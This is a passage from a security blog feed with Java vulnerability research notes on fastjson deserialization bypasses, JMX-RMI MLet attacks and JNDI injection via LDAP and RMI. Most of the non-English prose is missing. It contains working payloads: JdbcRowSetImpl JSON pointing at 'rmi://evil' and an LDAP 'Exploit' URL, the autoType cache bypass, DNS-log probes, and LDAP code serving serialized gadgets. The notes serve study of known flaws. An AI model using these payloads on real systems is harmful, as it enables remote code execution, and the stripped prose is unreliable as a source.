class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://evil:1099/test"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>JNDI<code>org.hibernate.jmx.StatisticsService</code><code>setSessionFactoryJNDIName</code></p><h2 id="3-Tomcat-dbcp-BasicDataSource"><a href="#3-Tomcat-dbcp-BasicDataSource" class="headerlink" title="(3). Tomcat dbcp BasicDataSource"></a>(3). Tomcat dbcp BasicDataSource</h2><p>1TemplateImplBasicDataSource</p><p>getters<code>BasicDataSource</code><code>getConnection</code><code>createConnectionFactory</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411132559759.png" alt="image-20200411132559759"></p><p><code>createConnectionFactory</code>Class.forName</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411132736300.png" alt="image-20200411132736300"></p><p>driverClassNamedriverClassLoader<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>ClassLoaderclassnameBCELclassdefineClass</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411134429055.png" alt="image-20200411134429055"></p><p></p><h1 id="0x03-Fastjson"><a href="#0x03-Fastjson" class="headerlink" title="0x03 Fastjson"></a>0x03 Fastjson</h1><hr><p></p><h3 id="1-fastjson-1-2-25"><a href="#1-fastjson-1-2-25" class="headerlink" title="(1). fastjson == 1.2.25"></a>(1). fastjson == 1.2.25</h3><p><code>AutoType</code><code>@type</code><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></p><p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411232403665.png" alt="image-20200411232403665"></p><p><code>@type</code><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>1.2.25</p><ol><li><p><code>AutoType</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412223524510.png" alt="image-20200412223524510"></p><p></p></li><li><p><code>AutoType</code></p></li><li><p><code>AutoType</code>ClassLoaderDataSource</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412224904669.png" alt="image-20200412224904669"></p></li></ol><p><code>TypeUtils.loadClass</code></p><ul><li><p><code>Lxxx.class.xxx;</code><code>L</code>,<code>;</code>loadClass</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412232825982.png" alt="image-20200412232825982"></p></li><li><p><code>AppClassLoader.loadClass</code><code>Class.forName</code></p></li></ul><h4 id="AutoType"><a href="#AutoType" class="headerlink" title="AutoType"></a><code>AutoType</code></h4><p><code>AutoType</code></p><p><code>class.startsWith(deny)</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412233730761.png" alt="image-20200412233730761"></p><p><code>TypeUtils.loadClass</code><code>Lxxxx.class.xxx;</code></p><p><code>Lxxxxx;</code><code>startsWith</code></p><h3 id="2-fastjson-1-2-42"><a href="#2-fastjson-1-2-42" class="headerlink" title="(2). fastjson == 1.2.42"></a>(2). fastjson == 1.2.42</h3><p>hash</p><p><code>Lxxxxx;</code>42hash<code>L;</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413114125856.png" alt="image-20200413114125856"></p><p><code>LLxxxxx;;</code></p><p>hashhash<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">fastjson-blacklist</a></p><h3 id="3-fastjson-1-2-43"><a href="#3-fastjson-1-2-43" class="headerlink" title="(3). fastjson == 1.2.43"></a>(3). fastjson == 1.2.43</h3><p><code>LLxxxx;;</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413125108171.png" alt="image-20200413125108171"></p><p><code>LLxxxxx;;</code></p><h3 id="4-fastjson-1-2-48"><a href="#4-fastjson-1-2-48" class="headerlink" title="(4). fastjson == 1.2.48"></a>(4). fastjson == 1.2.48</h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>48<code>checkAutoType</code>1.2.47</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413130933666.png" alt="image-20200413130933666"></p><p><code>AutoType</code>mappings</p><p>PSmappingsfastjson</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413131026571.png" alt="image-20200413131026571"></p><p>mappingsmappings</p><p><code>deserializers.findClass</code><code>deserializers</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413131650373.png" alt="image-20200413131650373"></p><p><code>Class.class</code><code>MiscCodec</code><code>checkAutoType</code><code>deserialze</code>MiscCodec<code>Class.class</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413132337804.png" alt="image-20200413132337804"></p><p><code>TypeUtils.loadClass</code><code>ClassLoader.loadClass</code><code>Class.forName</code><code>mappings</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413132644597.png" alt="image-20200413132644597"></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413132704804.png" alt="image-20200413132704804"></p><p><code>cache</code><code>true</code><code>mappings</code></p><p><code>mappings</code><code>AutoType</code><code>Class.class</code><code>mappings</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line">json = <span class="string">"&#123;"</span> + <span class="comment">// Classcom.sun.rowset.JdbcRowSetImplmappings</span></span><br><span class="line">          <span class="string">"&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span> +</span><br><span class="line">  <span class="comment">// mappingscom.sun.rowset.JdbcRowSetImpl</span></span><br><span class="line">          <span class="string">"&#123;\"@type\": \"com.sun.rowset.JdbcRowSetImpl\","</span> +</span><br><span class="line">          <span class="string">"\"dataSourceName\": \"ldap://localhost:1389/Exploit\","</span> +</span><br><span class="line">          <span class="string">"\"autoCommit\": true&#125;"</span> +</span><br><span class="line">        <span class="string">"&#125;"</span>;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>1.2.48</p><p><code>MiscCodec</code>Class<code>cache=false</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413134143022.png" alt="image-20200413134143022"></p><p><code>TypeUtils.loadClass</code><code>mappings</code><code>cache</code><code>false</code><code>mappings</code><code>Class.forName</code>cache48cache</p><p><code>java.lang.Class</code></p><h3 id="5-"><a href="#5-" class="headerlink" title="(5). "></a>(5). </h3><p></p><ul><li><code>AutoType</code></li><li><code>deserializers</code>(<code>Class.class</code>)</li></ul><p>1.2.68<a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode" target="_blank" rel="noopener">safeMode</a><code>checkAutoType</code>safemode<code>@type</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413161935377.png" alt="image-20200413161935377"></p><p></p><h3 id="6-"><a href="#6-" class="headerlink" title="(6). "></a>(6). </h3><ul><li><p>fastjson &lt; 1.2.60 dos <a href="http://m0d9.me/2019/09/06/Fastjson-1-2-60-Dos/" target="_blank" rel="noopener">Fastjson-1-2-60-Dos</a></p></li><li><p>dnslogfastjson <a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/issues/3077</a></p><p><code>Class.class</code><code>java.net.URL</code><code>java.net.Inet4Address</code><code>java.net.Inet6Address</code>MiscCodecdns</p><p>URLysoserialURLDNShashcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net&quot;&#125;:&quot;aaa&quot;&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x04-"><a href="#0x04-" class="headerlink" title="0x04 "></a>0x04 </h1><hr><p>fastjson</p><p>fastjson</p><ul><li>settersgettersparseparseObjectgetterparseObjectparseparseObject</li><li><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></li><li>fastjsonjndi</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesJava JMX-RMI</title>
      <link href="2020/03/10/java/java-jmx-rmi/"/>
      <url>2020/03/10/java/java-jmx-rmi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h2><p>RMIJMX(Java Management Extentions)JMX<br><a id="more"></a></p><h2 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h2><p><a href="https://mogwailabs.de/blog/2019/04/attacking-rmi-based-jmx-services/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/04/attacking-rmi-based-jmx-services/</a></p><p>JMX</p><blockquote><p>Java Management Extensions (JMX) is a Java technology that supplies tools for managing and monitoring applications, system objects, devices (such as printers) and service-oriented networks.</p></blockquote><p>MBean</p><blockquote><p>JMX allows you to manage resources as managed beans. A managed bean (MBean) is a Java Bean class that follows certain design rules of the JMX standard. An MBean can represent a device, an application, or any resource that needs to be managed over JMX. You can access these MBeans via JMX, query attributes and invoke Bean methods.</p><p>The JMX standard differs between various MBean types however, we will only deal with the standard MBeans here. To be a valid MBean, a Java class must:</p><ul><li>Implement an interface</li><li>Provide a default constructor (without any arguments)</li><li>Follow certain naming conventions, for example implement getter/setter methods to read/write attributes</li></ul></blockquote><p>MBean<code>Hello</code>interface<code>HelloMBean</code>MBean</p><p>MBean Server</p><blockquote><p>A MBean server is a service that manages the MBeans of a system. Developers can register their MBeans in the server following a specific naming pattern. The MBean server will forward incoming messages to the registered MBeans. The service is also responsible to forward messages from MBeans to external components.</p></blockquote><p>DEMO<code>jconsole</code></p><p><img src="/images/java-jmx-rmi-20200310/image-20200306152727840-4519092.png" alt="image-20200306152727840"></p><p>JConsoleMBean<code>sayHello</code></p><p>MBean Server(javaMBean Server)MBean ServerMBean</p><p>jar<code>-Dcom.sun.management.jmxremote.port=2222 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false</code></p><p>JConsole1:<code>host:port</code>;2:<code>service:jmx:&lt;protocol&gt;:&lt;sap&gt;</code></p><p>jmx2222nmap</p><p><img src="/images/java-jmx-rmi-20200310/image-20200306155425100-4519092.png" alt="image-20200306155425100"></p><p>JMXMBean ServerRMIRMI Registy<code>jmxrmi</code></p><p>Server<a href="https://docs.oracle.com/javase/8/docs/api/index.html?javax/management/remote/rmi/package-summary.html" target="_blank" rel="noopener">JMX RMI connector API</a></p><blockquote><p>There are two forms for RMI connector addresses:</p><ul><li>In the <em>JNDI form</em>, the URL indicates <em>where to find an RMI stub for the connector</em>. This RMI stub is a Java object of type <a href="https://docs.oracle.com/javase/8/docs/api/javax/management/remote/rmi/RMIServer.html" target="_blank" rel="noopener"><code>RMIServer</code></a> that gives remote access to the connector server. With this address form, the RMI stub is obtained from an external directory entry included in the URL. An external directory is any directory recognized by <a href="https://docs.oracle.com/javase/8/docs/api/javax/naming/package-summary.html" target="_blank" rel="noopener"><code>JNDI</code></a>, typically the RMI registry, LDAP, or COS Naming.</li><li>In the <em>encoded form</em>, the URL directly includes the information needed to connect to the connector server. When using RMI/JRMP, the encoded form is the serialized RMI stub for the server object, encoded using BASE64 without embedded newlines. When using RMI/IIOP, the encoded form is the CORBA IOR for the server object.</li></ul></blockquote><p>encoded form</p><p>JNDIJMX Server</p><p>ConnectorJRMPiiop</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. service:jmx:rmi://host:port/</span><br><span class="line">2. service:jmx:iiop://host:port/</span><br></pre></td></tr></table></figure><p>connectors</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. service:jmx:rmi://host:port/jndi/jndi-name</span><br><span class="line">2. service:jmx:iiop://host:port/jndi/jndi-name</span><br><span class="line"></span><br><span class="line">serivce:jmx:rmi://&lt;host&gt;/jndi/rmi://host:port/jmxrmi</span><br></pre></td></tr></table></figure><p>jndispi</p><h2 id="0x02-JMX"><a href="#0x02-JMX" class="headerlink" title="0x02 JMX"></a>0x02 JMX</h2><h3 id="1-JMX-RMI"><a href="#1-JMX-RMI" class="headerlink" title="1. JMX-RMI"></a>1. JMX-RMI</h3><p><strong>CVE-2016-3427</strong> JMXHashMapHashMapClassPathXD</p><p><strong>1</strong>RMI Registybind jdk&lt;8u141_b10(check host<a href="http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/"></a>)<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/c92d704420d7#l2.32" target="_blank" rel="noopener">8u141_b10</a>SingleEntryRegistryfilter</p><p><img src="/images/java-jmx-rmi-20200310/image-20200306170312638-4519092.png" alt="image-20200306170312638"></p><p>registry</p><p><strong>2</strong>:RMI DGCJEP 290(ysoserialJRMPClient<a href="http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/"></a>0x08)</p><p>JDK8RMIMBean ServerRMIRMI ServerObject</p><h3 id="2-"><a href="#2-" class="headerlink" title="2. "></a>2. </h3><p>MBean ServerMBean Server<code>object[]</code>RMI</p><p><code>javax/management/remote/rmi/RMIConnectionImpl.java#unwrap</code></p><p><img src="/images/java-jmx-rmi-20200310/image-20200306212145063-4519092.png" alt="image-20200306212145063"></p><p>1583<code>mo.get()</code></p><p><code>java/rmi/MarshalledObject.java#get</code></p><p><img src="/images/java-jmx-rmi-20200310/image-20200306212242480-4519092.png" alt="image-20200306212242480"></p><p></p><p>MBean ServerMBeaninvoke</p><p><img src="/images/java-jmx-rmi-20200310/image-20200306212452672-4519092.png" alt="image-20200306212452672"></p><p><code>java.util.logging.Logging#getLoggerLevel(String)</code>Stringpayloadinvoke</p><p>MBean</p><h3 id="3-MLETMBean"><a href="#3-MLETMBean" class="headerlink" title="3. MLETMBean"></a>3. MLETMBean</h3><p></p><p><strong></strong></p><ol><li>security manager</li><li></li></ol><p><strong></strong></p><ol><li>HTTP ServermletMBeanjar</li><li><code>createMBean(&quot;javax.management.loading.MLet&quot;, null);</code>JMXMLet</li><li><code>getMBeansFromURL</code>HTTP Servermlet</li><li>mletcodebasejarMBean</li><li>MBean</li></ol><p><strong></strong></p><p>MLetJMXMBeanMLet(MLet)codebaseJarMLetgetMBeansFromURL</p><p><code>javax/management/loading/MLet.java#getMBeansFromURL</code></p><ol><li><p>MLet</p></li><li><p>MLetcodebasearchivejarURL</p></li><li>URLClassLoader</li></ol><p>2URLMBeanServer</p><p></p><p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html</a></p><blockquote><p><strong>Caution -</strong> This configuration is insecure: any remote user who knows (or guesses) your port number and host name will be able to monitor and control your Java applications and platform. Furthermore, possible harm is not limited to the operations you define in your MBeans. A remote client could create a <code>javax.management.loading.MLet</code> MBean and use it to create new MBeans from arbitrary URLs, at least if there is <strong>no security manager</strong>. In other words, a rogue remote client could make your Java application execute arbitrary code.</p><p>Consequently, while disabling security might be acceptable for development, it is strongly recommended that you <strong>do not disable security for production systems</strong>.</p></blockquote><p>MLet</p><p><code>com/sun/jmx/remote/security/MBeanServerFileAccessController.java#checkAccess</code>Create(createPatterns)falseMLetMBean</p><p><img src="/images/java-jmx-rmi-20200310/image-20200318153641087.png" alt="image-20200318153641087"></p><p>security manager</p><p><img src="/images/java-jmx-rmi-20200310/image-20200318155835634.png" alt="image-20200318155835634"></p><p></p><h2 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h2><p>JMXGadgetGadgetJMX MLetcodebaseJar</p><p>JMXRMIJDKRMI</p><p><a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">github</a></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesJNDI with LDAP</title>
      <link href="2020/03/01/java/jndi-with-ldap/"/>
      <url>2020/03/01/java/jndi-with-ldap/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h2><p>JNDISPIRMILDAPRMILDAPReferenceJNDINaming ManagerJNDIldapXD</p><a id="more"></a><h2 id="0x01-LDAP"><a href="#0x01-LDAP" class="headerlink" title="0x01 LDAP"></a>0x01 LDAP</h2><p>LDAP<a href="https://www.cnblogs.com/wilburxu/p/9174353.html" target="_blank" rel="noopener"></a></p><blockquote><p>LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory:</p><p> Using Java serialization<br>        o <a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html</a><br> Using JNDI References<br>        o <a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html</a></p><p>from <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p></blockquote><p>JavaLDAPJava</p><p>LDAP Server<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java" target="_blank" rel="noopener">mbechler LDAPRefServer</a>ClientJNDIlookupjdkjdk8u162</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(<span class="string">"ldap://127.0.0.1:1389/EvilObj"</span>);</span><br><span class="line">ctx.close();</span><br></pre></td></tr></table></figure><h2 id="0x02-LDAP-with-JDNI-References"><a href="#0x02-LDAP-with-JDNI-References" class="headerlink" title="0x02 LDAP with JDNI References"></a>0x02 LDAP with JDNI References</h2><p>JNDIldaplookupLDAP ServerEntryClient</p><p><img src="/images/jndi-with-ldap-20200301/image-20200301142213589.png" alt="image-20200301142213589"></p><p>com/sun/jndi/ldap/Obj.java#decodeObjectLDAP ServerReferenceReference</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Object <span class="title">decodeObject</span><span class="params">(Attributes attrs)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    Attribute attr;</span><br><span class="line">    <span class="comment">// Get codebase, which is used in all 3 cases.</span></span><br><span class="line">    String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);<span class="comment">// "objectClass"</span></span><br><span class="line">        <span class="keyword">if</span> (attr != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || <span class="comment">// "javaNamingReference"</span></span><br><span class="line">                attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123; <span class="comment">// "javanamingreference"</span></span><br><span class="line">            <span class="keyword">return</span> decodeReference(attrs, codebases);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>LDAP Server<code>objectClass</code><code>javaNamingReference</code>ReferencedecodeReference</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    className = (String)attr.get();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] +</span><br><span class="line">                <span class="string">" attribute is required"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    factory = (String)attr.get();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Reference ref = <span class="keyword">new</span> Reference(className, factory,</span><br><span class="line">    (codebases != <span class="keyword">null</span>? codebases[<span class="number">0</span>] : <span class="keyword">null</span>));</span><br></pre></td></tr></table></figure><p>decodeReference<code>javaClassName</code><code>javaFactory</code>Reference<a href="http://blog.0kami.cn/2020/02/09/jndi-with-rmi/">jndi-with-rmi</a>refRMIReferenceWrapperrefNaming Managercodebaseclass</p><p>LDAPrefNamingManagerjavax/naming/spi/DirectoryManager.javaRMIjavax/naming/spi/NamingManager.java#getObjectFactoryFromReference</p><p>mbechler LDAPRefServer</p><p><img src="/images/jndi-with-ldap-20200301/image-20200301144715061.png" alt="image-20200301144715061"></p><p>LDAPReference</p><h2 id="0x03-LDAP-with-Serialized-Object"><a href="#0x03-LDAP-with-Serialized-Object" class="headerlink" title="0x03 LDAP with Serialized Object"></a>0x03 LDAP with Serialized Object</h2><p>JNDIJNDI Reference</p><h4 id="com-sun-jndi-ldap-Obj-java-decodeObject"><a href="#com-sun-jndi-ldap-Obj-java-decodeObject" class="headerlink" title="com/sun/jndi/ldap/Obj.java#decodeObject"></a>com/sun/jndi/ldap/Obj.java#decodeObject</h4><p>com/sun/jndi/ldap/Obj.java#decodeObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != <span class="keyword">null</span>) &#123;<span class="comment">// javaSerializedData</span></span><br><span class="line">    ClassLoader cl = helper.getURLClassLoader(codebases);</span><br><span class="line">    <span class="keyword">return</span> deserializeObject((<span class="keyword">byte</span>[])attr.get(), cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>javaSerializedData</code><code>deserializeObject</code>readObjectpayload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processAttribute</span><span class="params">(Entry entry)</span></span>&#123;</span><br><span class="line">  entry.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);</span><br><span class="line">  entry.addAttribute(<span class="string">"javaSerializedData"</span>, serialized);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>codebaseRCE</p><h4 id="com-sun-jndi-ldap-Obj-java-decodeReference"><a href="#com-sun-jndi-ldap-Obj-java-decodeReference" class="headerlink" title="com/sun/jndi/ldap/Obj.java#decodeReference"></a>com/sun/jndi/ldap/Obj.java#decodeReference</h4><p><code>decodeReference</code>ReferenceRefAddress<code>deserializeObject</code>RefAddress</p><p></p><ol><li></li><li>Referencepositionint</li><li>type</li><li></li><li>base64</li></ol><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processAttribute</span><span class="params">(Entry entry)</span></span>&#123;</span><br><span class="line">  entry.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);</span><br><span class="line">  entry.addAttribute(<span class="string">"javaReferenceAddress"</span>,<span class="string">"$1$String$$"</span>+<span class="keyword">new</span> BASE64Encoder().encode(serialized));</span><br><span class="line">  entry.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h2 id="0x04-"><a href="#0x04-" class="headerlink" title="0x04 "></a>0x04 </h2><p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/rev/2db6890a9567#l1.33" target="_blank" rel="noopener">jdk8u191-b02</a><code>com.sun.jndi.ldap.object.trustURLCodebase</code>falsecodebaseReferenceSerializedData</p><p>jndi</p><ul><li><p>JDK 6u132, JDK 7u122, JDK 8u113com.sun.jndi.rmi.object.trustURLCodebasecom.sun.jndi.cosnaming.object.trustURLCodebase false</p><p><strong>jndirmi referenceldapreference</strong></p></li><li><p>Oracle JDK 11.0.18u1917u2016u211 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>false</p><p><strong>jndildap referencecodebasetrue</strong></p></li></ul><p>jdk8ujndi ldap<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/com/sun/jndi/ldap/Obj.java#l239" target="_blank" rel="noopener">1</a><a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/com/sun/jndi/ldap/Obj.java#l478" target="_blank" rel="noopener">2</a>jndi rmi(JRMPListener)<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/sun/rmi/transport/StreamRemoteCall.java#l270" target="_blank" rel="noopener">StreamRemoteCall</a></p><p>ReferenceClassPathRCE</p><h2 id="0x05-"><a href="#0x05-" class="headerlink" title="0x05 "></a>0x05 </h2><p>JNDILDAP2codebaseClassPathjdk8ucodebase<code>com.sun.jndi.ldap.object.trustURLCodebase</code></p><p>LDAPJNDIlookupSpringldapXD</p><p>ldap Server<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">github</a>XD</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesJNDI with RMI</title>
      <link href="2020/02/09/java/jndi-with-rmi/"/>
      <url>2020/02/09/java/jndi-with-rmi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h2><p>RMI RegistryJNDIRMIJNDIXD</p><a id="more"></a><h2 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h2><p>JNDIRMIRMI</p><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMICLASSPATHcodebaseclasscodebasejava.rmi.server.codebaseURLcodebaseURLclassjarPJava- RMIcodebaseserverRMI Serveroracle</p><blockquote><ul><li>SecurityManager</li><li>Java7u216u45<code>java.rmi.server.useCodebaseonly=false</code></li></ul><p>Java-RMI</p></blockquote><p>7u216u45<code>true</code>codebase</p><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><blockquote><p>Java Naming and Directory Interface (JNDI) is a Java API that allows clients to discover and look up data and objects via a name.</p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p></blockquote><p>JNDInaming serviceDirectory serviceURLAPIJNDIRMI codebaseRMI</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204162708130-1255889.png" alt="image-20200204162708130"></p><p>Naming ManagerJNDI SPISPIRMISPINaming ManagerNaming ManagerJNDINaming References</p><blockquote><p>In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate.</p><p>For such needs, JNDI defined <strong>Naming References</strong> (or just References from now on) so that objects could be stored in the Naming or Directory 